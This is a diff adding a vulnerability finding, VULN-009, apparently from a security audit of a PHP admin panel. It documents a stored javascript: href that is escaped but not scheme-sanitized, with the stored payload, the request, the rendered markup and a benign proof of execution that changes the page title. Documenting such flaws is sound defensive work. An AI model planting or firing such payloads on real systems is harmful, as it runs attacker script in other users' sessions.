@@ -1,0 +1,15 @@
+### VULN-009 — the stored javascript: href. Full capture in response.txt / evidence/*.png.
+### Attacker stores a Link whose url is a javascript: payload; PostResource's Links relation
+### renders TextColumn::make('url')->url(fn($state)=>$state) via generate_href_html(), which
+### e()-escapes but does NOT scheme-sanitize.
+
+### 1) Stored attacker value (Link.url) — representative row:
+###    url = javascript:document.title='PWNED-<suffix>'
+
+### 2) Viewer loads the post's Links table (authenticated):
+GET /admin/posts/1/edit  → (open "Links" relation tab)
+### Server-emitted markup (read from the live DOM):
+###    <a href="javascript:document.title='PWNED-<suffix>'" target="_blank" ...>clickme-<suffix></a>
+
+### 3) Viewer clicks the link → the javascript: executes in their session:
+###    document.title becomes "PWNED-<suffix>"   (proof of execution)
